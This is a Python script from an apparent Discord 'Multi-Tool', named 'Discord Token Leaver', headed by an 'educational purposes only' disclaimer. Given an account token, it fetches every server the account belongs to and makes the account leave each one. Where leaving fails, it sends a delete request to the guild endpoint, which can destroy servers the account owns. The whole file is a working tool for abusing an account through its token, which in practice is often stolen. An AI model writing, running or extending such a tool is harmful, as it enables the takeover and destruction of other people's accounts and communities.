# ============================================================
#  Author      : Anonyme-001
#  Project     : Multi-Tool (Educational Purpose Only)
#  Year        : 2025
#
#  DISCLAIMER:
#  This code is provided for EDUCATIONAL PURPOSES ONLY.
#  It is intended to help understand programming, security
#  concepts, and defensive techniques.
#
#  ❌ Any malicious use is strictly prohibited.
#  ❌ Do NOT modify this code to perform illegal actions.
#  ❌ The author is NOT responsible for any misuse.
#
#  By using this code, you agree to use it responsibly
#  and within legal boundaries.
#
#  Copyright (c) 2025 Anonyme-001
#  See LICENSE file for details.
# ============================================================


from Plugins.Utils import *
from Plugins.Config import *

try:
    import requests
except Exception as e:
    MissingModule(e)

Title("Discord Token Leaver")
Connection()

try:
    token = ChoiceToken()
    guilds_id = requests.get("https://discord.com/api/v9/users/@me/guilds", headers={'Authorization': token}).json()
    if not guilds_id:
        print(f"{INFO} No Server found.", reset)
        Continue()
        Reset()

    print(f"{INFO} Leaving all Servers..")
        
    for i in range(0, len(guilds_id), 3):
        guild_group = guilds_id[i:i+3]
            
        for guilds in guild_group:
            try:
                response = requests.delete(f'https://discord.com/api/v9/users/@me/guilds/'+guilds['id'], headers={'Authorization': token})
                if response.status_code == 204 or response.status_code == 200:
                    print(f"{SUCCESS} Status:{red} Left   {white}| Server:{red} {guilds['name']}", reset)
                elif response.status_code == 400:
                    response = requests.delete(f'https://discord.com/api/v9/guilds/'+guilds['id'], headers={'Authorization': token})
                    if response.status_code == 204 or response.status_code == 200:
                        print(f"{SUCCESS} Status:{red} Left   {white}| Server:{red} {guilds['name']}", reset)
                    else:
                        print(f"{ERROR} Status:{red} Failed {white}| Server:{red} {guilds['name']}", reset)
            except:
                print(f"{ERROR} Status:{red} Error  {white}| Server:{red} {guilds['name']}", reset)
        Continue()
        Reset()

except Exception as e:
    Error(e)